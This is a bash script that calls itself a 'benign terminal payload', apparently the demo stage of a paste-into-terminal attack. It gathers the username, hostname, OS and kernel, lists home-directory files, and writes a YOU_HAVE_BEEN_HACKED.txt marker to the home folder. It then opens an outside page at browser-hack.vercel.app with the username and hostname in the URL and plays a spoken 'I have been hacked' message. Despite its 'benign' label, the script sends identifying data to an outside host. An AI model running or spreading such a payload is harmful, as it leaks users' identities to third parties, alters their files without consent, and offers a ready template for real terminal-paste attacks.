#!/bin/bash
# Benign terminal payload. No deletion, no persistence, no admin.
set -u

U="$(whoami)"
H="$(hostname)"
OS="$(sw_vers -productVersion 2>/dev/null || uname -sr)"
K="$(uname -a)"
DESK="$HOME"

clear 2>/dev/null || true
cat <<'BANNER'
  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
  ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝
BANNER

sleep 0.25
echo
echo "[+] terminal payload executed"
sleep 0.35
echo "[+] target : $U@$H"
echo "[+] os     : macOS $OS"
echo "[+] kernel : $K"
sleep 0.35
echo
echo "[+] identity"
printf '    '; whoami
echo "[+] home contents"
ls -1 "$DESK" 2>/dev/null | head -8 | sed 's/^/    /'
echo
echo "[+] writing proof marker..."
MARKER="$DESK/YOU_HAVE_BEEN_HACKED.txt"
{
  echo "TERMINAL COMPROMISED"
  echo "target: $U@$H"
  echo "date: $(date)"
  echo "kernel: $K"
  echo
  echo "A one-line terminal payload executed as $U."
  echo "This is a benign demo. No files were deleted."
} > "$MARKER" 2>/dev/null && echo "    $MARKER" || echo "    (could not write marker)"

sleep 0.45
echo
echo "[+] opening proof page..."
URL="https://browser-hack.vercel.app/hacked.html?u=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$U" 2>/dev/null || printf '%s' "$U")&h=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$H" 2>/dev/null || printf '%s' "$H")"
if command -v open >/dev/null 2>&1; then
  open "$URL" >/dev/null 2>&1 || true
elif command -v xdg-open >/dev/null 2>&1; then
  xdg-open "$URL" >/dev/null 2>&1 || true
fi
sleep 0.3
if command -v say >/dev/null 2>&1; then
  say "I have been hacked" >/dev/null 2>&1 &
fi
echo "[+] done. terminal released."
echo "    marker: $MARKER"
